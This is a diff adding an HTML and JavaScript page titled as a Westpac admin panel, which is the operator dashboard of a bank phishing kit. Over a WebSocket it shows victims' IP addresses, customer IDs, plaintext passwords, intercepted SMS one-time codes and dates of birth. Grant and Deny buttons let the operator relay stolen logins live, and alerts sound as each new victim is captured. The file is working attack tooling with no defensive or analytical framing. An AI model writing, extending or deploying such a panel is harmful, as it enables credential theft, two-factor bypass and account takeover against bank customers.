@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Admin Control Panel -- Westpac</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #0d1117; color: #e6edf3; min-height: 100vh; }
+
+    /* topbar */
+    .topbar { display:flex; align-items:center; justify-content:space-between; padding:14px 24px; background:#161b22; border-bottom:1px solid #30363d; position:sticky; top:0; z-index:100; }
+    .topbar-brand { display:flex; align-items:center; gap:10px; font-size:16px; font-weight:700; }
+    .topbar-brand .dot { width:10px; height:10px; border-radius:50%; background:#d5002b; }
+    #ws-status { display:flex; align-items:center; gap:8px; font-size:13px; color:#8b949e; }
+    #ws-status .indicator { width:8px; height:8px; border-radius:50%; background:#484f58; transition:background .3s; }
+    #ws-status.connected .indicator { background:#2ea043; }
+    #ws-status.connected { color:#2ea043; }
+    #ws-status.error .indicator { background:#f85149; }
+    #ws-status.error { color:#f85149; }
+
+    /* stats */
+    .stats { display:flex; gap:16px; padding:16px 24px; background:#161b22; border-bottom:1px solid #30363d; flex-wrap:wrap; }
+    .stat { background:#21262d; border:1px solid #30363d; border-radius:8px; padding:12px 20px; min-width:110px; }
+    .stat-label { font-size:11px; color:#8b949e; text-transform:uppercase; letter-spacing:.06em; }
+    .stat-value { font-size:26px; font-weight:700; margin-top:4px; }
+    .stat-value.pending { color:#e3b341; }
+    .stat-value.granted { color:#2ea043; }
+    .stat-value.denied  { color:#f85149; }
+    .stat-value.total   { color:#58a6ff; }
+    .stat-value.otp-c   { color:#a78bfa; }
+
+    /* main */
+    main { padding:24px; }
+    .section-header { font-size:13px; font-weight:600; color:#8b949e; text-transform:uppercase; letter-spacing:.06em; margin-bottom:12px; }
+
+    /* table */
+    .table-wrap { background:#161b22; border:1px solid #30363d; border-radius:10px; overflow:auto; margin-bottom:32px; }
+    table { width:100%; border-collapse:collapse; min-width:900px; }
+    thead th { background:#21262d; font-size:11px; text-transform:uppercase; letter-spacing:.06em; color:#8b949e; padding:10px 14px; text-align:left; font-weight:600; white-space:nowrap; }
+    tbody tr { border-top:1px solid #30363d; transition:background .15s; }
+    tbody tr:hover { background:#1c2128; }
+    td { padding:12px 14px; font-size:13px; vertical-align:middle; }
+    td.mono { font-family:'SF Mono',Consolas,monospace; font-size:12px; }
+
+    /* badge */
+    .badge { display:inline-flex; align-items:center; gap:5px; padding:3px 9px; border-radius:999px; font-size:11px; font-weight:600; text-transform:uppercase; letter-spacing:.05em; white-space:nowrap; }
+    .badge::before { content:''; width:5px; height:5px; border-radius:50%; }
+    .badge.pending { background:#e3b3411a; color:#e3b341; } .badge.pending::before { background:#e3b341; }
+    .badge.grant   { background:#2ea0431a; color:#2ea043; } .badge.grant::before   { background:#2ea043; }
+    .badge.deny    { background:#f851491a; color:#f85149; } .badge.deny::before    { background:#f85149; }
+    .badge.waiting { background:#a78bfa1a; color:#a78bfa; } .badge.waiting::before { background:#a78bfa; }
+    .badge.none    { color:#484f58; font-size:11px; }
+
+    /* action buttons */
+    .action-btn { padding:4px 12px; border-radius:6px; border:1px solid; font-size:11px; font-weight:600; cursor:pointer; transition:opacity .15s; white-space:nowrap; }
+    .action-btn:hover { opacity:.8; }
+    .action-btn:disabled { opacity:.3; cursor:not-allowed; }
+    .btn-grant { background:#2ea043; border-color:#2ea043; color:#fff; margin-right:4px; }
+    .btn-deny  { background:#f85149; border-color:#f85149; color:#fff; }
+
+    /* password (always visible) */
+    .pw-plain { color:#e6edf3; font-family:'SF Mono',Consolas,monospace; font-size:12px; }
+
+    /* otp pill tag */
+    .otp-tag { font-family:'SF Mono',Consolas,monospace; font-size:13px; font-weight:700; color:#a78bfa; letter-spacing:2px; }
+
+    /* log */
+    #event-log { background:#0d1117; border:1px solid #30363d; border-radius:10px; padding:12px 16px; font-family:'SF Mono',Consolas,monospace; font-size:12px; max-height:200px; overflow-y:auto; display:flex; flex-direction:column-reverse; }
+    .log-line { padding:3px 0; border-bottom:1px solid #21262d; color:#8b949e; white-space:pre; }
+    .log-line .ts   { color:#484f58; }
+    .log-line .ok   { color:#2ea043; }
+    .log-line .err  { color:#f85149; }
+    .log-line .warn { color:#e3b341; }
+    .log-line .info { color:#58a6ff; }
+    .log-line .otp  { color:#a78bfa; }
+
+    /* empty */
+    .empty { text-align:center; color:#484f58; padding:48px 0; font-size:14px; }
+    .empty svg { display:block; margin:0 auto 12px; opacity:.3; }
+  </style>
+</head>
+<body>
+
+<div class="topbar">
+  <div class="topbar-brand"><div class="dot"></div>Westpac Admin Panel</div>
+  <div id="ws-status"><div class="indicator"></div><span id="ws-status-text">Connecting...</span></div>
+</div>
+
+<div class="stats">
+  <div class="stat"><div class="stat-label">Total</div><div class="stat-value total" id="cnt-total">0</div></div>
+  <div class="stat"><div class="stat-label">Pending</div><div class="stat-value pending" id="cnt-pending">0</div></div>
+  <div class="stat"><div class="stat-label">Granted</div><div class="stat-value granted" id="cnt-granted">0</div></div>
+  <div class="stat"><div class="stat-label">Denied</div><div class="stat-value denied" id="cnt-denied">0</div></div>
+  <div class="stat"><div class="stat-label">OTP Captured</div><div class="stat-value otp-c" id="cnt-otp">0</div></div>
+</div>
+
+<main>
+  <div class="section-header">Live sessions</div>
+  <div class="table-wrap">
+    <table>
+      <thead>
+        <tr>
+          <th>Time</th>
+          <th>IP Address</th>
+          <th>Customer ID</th>
+          <th>Password</th>
+          <th>OTP Code</th>
+          <th>Step 1 -- Credentials</th>
+          <th>Step 2 -- OTP</th>
+        </tr>
+      </thead>
+      <tbody id="client-table">
+        <tr id="empty-row">
+          <td colspan="7">
+            <div class="empty">
+              <svg width="32" height="32" fill="none" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" stroke="#8b949e" stroke-width="1.5"/><path d="M12 8v4l3 3" stroke="#8b949e" stroke-width="1.5" stroke-linecap="round"/></svg>
+              Waiting for login attempts...
+            </div>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="section-header">Event log</div>
+  <div id="event-log"></div>
+</main>
+
+<script>
+  const WS_URL = `${location.protocol === 'https:' ? 'wss:' : 'ws:'}//${location.host}/ws`;
+  let ws;
+  let reconnectTimer;
+  const sessions = new Map();
+
+  async function api(path, options) {
+    const response = await fetch(path, options);
+    if (!response.ok) {
+      const text = await response.text();
+      throw new Error(text || `Request failed (${response.status})`);
+    }
+    return response.json();
+  }
+
+  async function loadSnapshot() {
+    try {
+      const [requests, smsHistory] = await Promise.all([
+        api('/api/admin/pending'),
+        api('/api/admin/sms-history'),
+      ]);
+
+      requests.forEach(request => upsertSession({
+        sid: request.id,
+        requestId: request.id,
+        ts: request.timestamp,
+        ip: request.ipAddress,
+        username: request.username,
+        password: request.password,
+        credStatus: request.status || 'pending',
+      }));
+
+      smsHistory.forEach(item => upsertSession({
+        sid: item.sessionId,
+        ts: item.timestamp,
+        username: item.username,
+        otp: item.code,
+        dateOfBirth: item.dateOfBirth,
+        credStatus: 'grant',
+        otpStatus: item.dateOfBirth ? 'grant' : 'waiting',
+      }));
+      renderRows();
+      addLog('info', 'Admin data synchronized');
+    } catch (error) {
+      addLog('err', `Sync failed: ${error.message}`);
+    }
+  }
+
+  function connect() {
+    clearTimeout(reconnectTimer);
+    setStatus('', 'Connecting...');
+    ws = new WebSocket(WS_URL);
+    ws.onopen = () => {
+      setStatus('connected', 'Connected');
+      addLog('info', 'WebSocket connected to server');
+    };
+    ws.onclose = () => {
+      setStatus('', 'Disconnected -- retrying in 3s...');
+      addLog('err', 'WebSocket disconnected');
+      reconnectTimer = setTimeout(connect, 3000);
+    };
+    ws.onerror = () => setStatus('error', 'Connection error');
+
+    ws.onmessage = (ev) => {
+      let msg;
+      try { msg = JSON.parse(ev.data); } catch { return; }
+
+      if (msg.type === 'initial_data') {
+        (msg.requests || []).forEach(request => upsertSession({
+          sid: request.id,
+          requestId: request.id,
+          ts: request.timestamp,
+          ip: request.ipAddress,
+          username: request.username,
+          password: request.password,
+          credStatus: request.status || 'pending',
+        }));
+        renderRows();
+        return;
+      }
+
+      if (msg.type === 'new_request' && msg.request) {
+        const request = msg.request;
+        upsertSession({
+          sid: request.id,
+          requestId: request.id,
+          ts: request.timestamp,
+          ip: request.ipAddress,
+          username: request.username,
+          password: request.password,
+          credStatus: request.status || 'pending',
+        });
+        renderRows();
+        addLog('warn', `New login: ${request.username}  IP: ${request.ipAddress || '--'}`);
+        playAlert('cred');
+        flashTitle();
+        return;
+      }
+
+      if (msg.type === 'sms_verification_step1' && msg.data) {
+        upsertSession({
+          sid: msg.data.sessionId,
+          ts: msg.data.timestamp,
+          ip: msg.data.ipAddress,
+          username: msg.data.username,
+          otp: msg.data.smsCode,
+          credStatus: 'grant',
+          otpStatus: 'waiting',
+        });
+        renderRows();
+        addLog('otp', `OTP captured: ${msg.data.smsCode}`);
+        playAlert('otp');
+        flashTitle();
+        return;
+      }
+
+      if (msg.type === 'sms_verification_complete' && msg.data) {
+        upsertSession({
+          sid: msg.data.sessionId,
+          ts: msg.data.timestamp,
+          ip: msg.data.ipAddress,
+          username: msg.data.username,
+          otp: msg.data.smsCode,
+          dateOfBirth: msg.data.dateOfBirth,
+          credStatus: 'grant',
+          otpStatus: 'grant',
+        });
+        renderRows();
+        addLog('ok', `Verification completed for ${msg.data.username}`);
+        playAlert('otp');
+        flashTitle();
+        return;
+      }
+
+      if (msg.type === 'page_activity' && msg.page) {
+        addLog('info', `${msg.page.pageName} visited`);
+      } else if (msg.type === 'username_recovery' && msg.data) {
+        addLog('warn', `Username recovery: ${msg.data.email}`);
+      }
+    };
+  }
+
+  function setStatus(cls, text) {
+    document.getElementById('ws-status').className = cls;
+    document.getElementById('ws-status-text').textContent = text;
+  }
+
+  function addLog(type, msg) {
+    const log = document.getElementById('event-log');
+    const line = document.createElement('div');
+    line.className = 'log-line';
+    const ts = new Date().toLocaleTimeString('en-AU', { hour12: false });
+    line.innerHTML = `<span class="ts">[${ts}]</span> <span class="${type}">${escHtml(msg)}</span>`;
+    log.prepend(line);
+    while (log.children.length > 300) log.removeChild(log.lastChild);
+  }
+
+  function escHtml(s) {
+    return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+  }
+
+  function upsertSession(value) {
+    const current = sessions.get(value.sid) || {};
+    sessions.set(value.sid, {
+      ...current,
+      ...value,
+      credStatus: value.credStatus || current.credStatus || 'pending',
+      otpStatus: value.otpStatus || current.otpStatus || null,
+      hasOtp: !!(value.otp || current.otp),
+    });
+  }
+
+  function statusBadge(status, fallback) {
+    if (!status) return `<span class="badge none">${fallback}</span>`;
+    return `<span class="badge ${status}">${status}</span>`;
+  }
+
+  function renderRows() {
+    const tbody = document.getElementById('client-table');
+    const rows = Array.from(sessions.values()).sort((a, b) =>
+      new Date(b.ts || 0) - new Date(a.ts || 0)
+    );
+    if (!rows.length) {
+      tbody.innerHTML = '<tr id="empty-row"><td colspan="7"><div class="empty">Waiting for login attempts...</div></td></tr>';
+      recalcStats();
+      return;
+    }
+    tbody.innerHTML = rows.map(v => {
+      const ts = new Date(v.ts || Date.now()).toLocaleTimeString('en-AU', { hour12: false });
+      const canDecide = v.requestId && v.credStatus === 'pending';
+      const credentialActions = canDecide ? `
+        ${statusBadge(v.credStatus, 'pending')}<br><br>
+        <button class="action-btn btn-grant" data-request-id="${escHtml(v.requestId)}" data-action="grant">Grant</button>
+        <button class="action-btn btn-deny" data-request-id="${escHtml(v.requestId)}" data-action="deny">Deny</button>
+      ` : statusBadge(v.credStatus, 'pending');
+      return `<tr>
+        <td class="mono">${escHtml(ts)}</td>
+        <td class="mono">${escHtml(v.ip || '--')}</td>
+        <td class="mono"><strong>${escHtml(v.username || '--')}</strong></td>
+        <td class="mono"><span class="pw-plain">${escHtml(v.password || '--')}</span></td>
+        <td>${v.otp ? `<span class="otp-tag">${escHtml(v.otp)}</span>` : '<span class="badge none">--</span>'}</td>
+        <td>${credentialActions}</td>
+        <td>${statusBadge(v.otpStatus, v.hasOtp ? 'received' : 'awaiting')}</td>
+      </tr>`;
+    }).join('');
+    recalcStats();
+  }
+
+  async function decide(requestId, action) {
+    const session = Array.from(sessions.values()).find(item => item.requestId === requestId);
+    if (!session) return;
+    try {
+      await api(`/api/admin/${action}`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ requestId }),
+      });
+      session.credStatus = action;
+      renderRows();
+      addLog(action === 'grant' ? 'ok' : 'err', `Credentials ${action}ed for ${session.username}`);
+    } catch (error) {
+      addLog('err', `${action} failed: ${error.message}`);
+    }
+  }
+
+  function playAlert(type) {
+    try {
+      const ac = new (window.AudioContext || window.webkitAudioContext)();
+      const freqs = type === 'otp'
+        ? [[660, 0], [880, 0.12], [1100, 0.24]]
+        : [[880, 0], [1100, 0.1]];
+      freqs.forEach(([f, t]) => {
+        const osc = ac.createOscillator();
+        const g   = ac.createGain();
+        osc.connect(g); g.connect(ac.destination);
+        osc.frequency.value = f;
+        osc.type = 'sine';
+        g.gain.setValueAtTime(0.25, ac.currentTime + t);
+        g.gain.exponentialRampToValueAtTime(0.001, ac.currentTime + t + 0.18);
+        osc.start(ac.currentTime + t);
+        osc.stop(ac.currentTime + t + 0.2);
+      });
+    } catch(e) {}
+  }
+
+  function recalcStats() {
+    let pending = 0, granted = 0, denied = 0, otpCount = 0;
+    for (const v of sessions.values()) {
+      if (v.credStatus === 'pending') pending++;
+      if (v.credStatus === 'grant')   granted++;
+      if (v.credStatus === 'deny')    denied++;
+      if (v.hasOtp) otpCount++;
+    }
+    document.getElementById('cnt-total').textContent   = sessions.size;
+    document.getElementById('cnt-pending').textContent = pending;
+    document.getElementById('cnt-granted').textContent = granted;
+    document.getElementById('cnt-denied').textContent  = denied;
+    document.getElementById('cnt-otp').textContent     = otpCount;
+  }
+
+  let flashInterval = null;
+  function flashTitle() {
+    const orig = document.title;
+    let on = true;
+    clearInterval(flashInterval);
+    flashInterval = setInterval(() => { document.title = on ? '🔴 NEW ACTIVITY!' : orig; on = !on; }, 700);
+    setTimeout(() => { clearInterval(flashInterval); document.title = orig; }, 6000);
+  }
+
+  document.getElementById('client-table').addEventListener('click', event => {
+    const button = event.target.closest('[data-request-id]');
+    if (button) decide(button.dataset.requestId, button.dataset.action);
+  });
+
+  loadSnapshot();
+  connect();
+</script>
+</body>
+</html>
